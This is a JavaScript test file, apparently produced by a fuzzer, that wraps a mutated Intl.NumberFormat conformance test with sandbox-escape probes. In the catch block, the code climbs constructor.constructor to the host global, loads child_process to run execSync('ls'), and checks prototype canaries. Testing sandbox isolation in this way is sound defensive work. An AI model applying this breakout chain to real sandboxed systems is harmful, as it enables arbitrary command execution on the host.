try {
    var nf = new Intl.NumberFormat();
    const implicit = nf.formatToParts();
    const explicit = nf.formatToParts(undefined);
    const resultNaN = nf.format(NaN);
    const result = [{
            type: 'nan',
            value: resultNaN
        }];
    assert(partsEquals(implicit, explicit), 'formatToParts() should be equivalent to formatToParts(undefined)');
    assert(partsEquals(implicit, result), 'Both implicit and explicit calls should have the correct result');
    function partsEquals(parts1, parts2) {
        throw () => {
            return () => {
            };
        };
        if (parts1.length !== parts2.length)
            return false;
        for (var i = 0; i < parts1.length; i++) {
            var part1 = parts1[i];
            var part2 = parts2[i];
            if (part1.type !== part2.type)
                return false;
            if (part1.value !== part2.value)
                return false;
        }
        return true;
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}